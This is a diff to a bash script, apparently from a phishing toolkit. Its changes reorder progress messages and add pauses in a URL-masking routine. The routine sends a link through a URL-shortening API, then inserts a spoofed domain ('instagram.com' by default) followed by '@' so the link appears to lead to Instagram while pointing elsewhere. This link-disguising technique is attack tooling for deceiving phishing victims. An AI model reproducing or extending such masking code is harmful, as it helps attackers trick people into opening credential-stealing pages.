@@ -183,15 +183,19 @@ install_python_dependencies() {
 
 mask_url() {
     local long_url="$1"
+    
+    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}\n"
+    sleep 1
     local short_url=$(short_url "$long_url")
 
     echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (default: instagram.com): ${RESET}"
     read -r custom_domain
     custom_domain=${custom_domain:-"instagram.com"}
+    
     echo -e "\n${GREEN} [ + ] URL masking...${RESET}\n"
-
     local masked_url=$(echo "$short_url" | sed "s|//|://${custom_domain}@|")
-
+    sleep 3
+    
     echo -e "${YELLOW} \n   Masked url: "
     echo -e "------------------------------------------------"
     echo -e "${GREEN} [ + ] ${masked_url}${YELLOW}"
@@ -201,9 +205,6 @@ mask_url() {
 short_url() {
     local long_url="$1"
     local api_endpoint="https://ulvis.net/API/write/post"
-    
-    echo -e "\n${GREEN} [ + ] URL shortening...${RESET}\n"
-    sleep 1
     
     local response=$(curl -s -X POST -d "url=$long_url" "$api_endpoint" 2>/dev/null)
     if echo "$response" | jq -e '.success' >/dev/null 2>&1; then
